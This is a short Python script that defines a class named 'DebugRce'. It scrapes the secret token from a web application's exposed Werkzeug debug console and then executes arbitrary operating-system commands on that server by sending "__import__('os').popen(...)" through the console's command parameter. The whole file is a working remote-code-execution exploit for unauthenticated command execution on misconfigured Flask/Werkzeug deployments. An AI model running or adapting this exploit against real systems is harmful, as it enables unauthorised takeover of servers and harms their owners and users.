from requests_html import HTMLSession

class DebugRce:
	def __init__(self, URL) -> None:
		self.URL = URL
		self.req = HTMLSession()
		self.secret = self.req.get(f'http://{self.URL}/console').html.find('script')[1].text.split(' ')[-1][1:-2]

	def exec(self, cmd) -> list:
		self.cmd = f'''__import__('os').popen('{cmd}').read();'''
		self.res = self.req.get(f'http://{self.URL}/console?__debugger__=yes&cmd={self.cmd}&frm=0&s={self.secret}')
		return self.res.html.text[1:-1].split('\\n')[0:-1]
